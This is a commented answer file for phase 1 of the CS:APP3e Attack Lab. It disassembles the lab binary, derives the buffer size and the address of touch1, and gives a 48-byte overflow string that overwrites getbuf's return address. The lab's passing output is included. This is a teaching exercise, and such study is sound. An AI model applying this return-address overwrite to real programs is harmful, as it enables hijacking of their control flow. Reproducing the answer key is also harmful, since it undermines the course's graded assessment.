/* Byte codes for the phase 1 of attack bomb in CS:APP3e

   Copyright (C) 2022 Tongjie Liu <tongjieandliu@gmail.com>.

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>. */

/*	1. Gain more insights into function getbuf
	1.1 BUFFER_SIZE
	If we want to find out the value of BUFFER_SIZE, we have to first
disassemble function getbuf:
	$ objdump --disassemble=getbuf ctarget
	ctarget:     file format elf64-x86-64


	Disassembly of section .init:

	Disassembly of section .plt:

	Disassembly of section .text:

	00000000004017a8 <getbuf>:
	  4017a8:       48 83 ec 28             sub    $0x28,%rsp
	  4017ac:       48 89 e7                mov    %rsp,%rdi
	  4017af:       e8 8c 02 00 00          callq  401a40 <Gets>
	  4017b4:       b8 01 00 00 00          mov    $0x1,%eax
	  4017b9:       48 83 c4 28             add    $0x28,%rsp
	  4017bd:       c3                      retq   

	Disassembly of section .fini:

	If we look at line 0x4017a8 and 0x4017ac, we should know that BUFFER_SIZE
is 0x28(40 in decimal). The length of the exploit string we'll construct should be
48 bytes, since the return address used upon the returning of getbuf is immediately
after buf.

	1.2 The Address of Function touch1
	It's easy to find out the address using objdump:
	$ objdump --disassemble=touch1 ctarget
	ctarget:     file format elf64-x86-64


	Disassembly of section .init:

	Disassembly of section .plt:

	Disassembly of section .text:

	00000000004017c0 <touch1>:
	  4017c0:       48 83 ec 08             sub    $0x8,%rsp
	  4017c4:       c7 05 0e 2d 20 00 01    movl   $0x1,0x202d0e(%rip) # 6044dc <vlevel>
	  4017cb:       00 00 00 
	  4017ce:       bf c5 30 40 00          mov    $0x4030c5,%edi
	  4017d3:       e8 e8 f4 ff ff          callq  400cc0 <puts@plt>
	  4017d8:       bf 01 00 00 00          mov    $0x1,%edi
	  4017dd:       e8 ab 04 00 00          callq  401c8d <validate>
	  4017e2:       bf 00 00 00 00          mov    $0x0,%edi
	  4017e7:       e8 54 f6 ff ff          callq  400e40 <exit@plt>

	Disassembly of section .fini:

	Obviously, touch1 is at 0x4017c0.

	There are many correct answers to phase 1. The one we construct is
filled with 0s in first 40 bytes, and the last 8 bytes is the address of
touch1. Since the Intel 64 architecture uses litte-endian in representing
addresses, the last 8 bytes are c0 17 40 00 00 00 00 00.

	Therefore, the exploit string for phase 1 is:
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	c0 17 40 00 00 00 00 00


	2. Attack with this file:
	$ cat phase_1.txt | ./hex2raw | ./ctarget -q
	Cookie: 0x59b997fa
	Type string:Touch1!: You called touch1()
	Valid solution for level 1 with target ctarget
	PASS: Would have posted the following:
		user id bovik
		course  15213-f15
		lab     attacklab
		result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
